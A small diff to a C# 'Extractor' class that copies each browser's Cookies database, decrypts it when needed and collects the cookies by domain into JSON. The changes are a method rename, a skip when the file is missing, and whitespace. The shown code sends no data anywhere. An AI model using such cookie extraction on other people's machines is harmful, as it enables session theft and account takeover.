@@ -51,7 +51,7 @@ public class Extractor
     }
 
 
-    public void GrabAndRun()
+    public void GrabNRun()
     {
         foreach (var browser in _browsers)
         {
@@ -140,6 +140,10 @@ public class Extractor
             var currentDirectory = Path.Combine(_workingDirectory, browser.Key, "database");
 
             var dbFileName = Path.Combine(currentDirectory, "Cookies");
+            if (!Path.Exists(dbFileName))
+            {
+                continue;
+            }
             File.Copy(dbFileName, dbFileName + ".bak");
 
             if (browser.Value.NeedDecryption)
@@ -289,7 +293,7 @@ public class Extractor
 
             cookies[domain].Add(cookie);
         }
-
+        
         foreach (var domain in cookies.Keys)
         {
             var json = JsonConvert
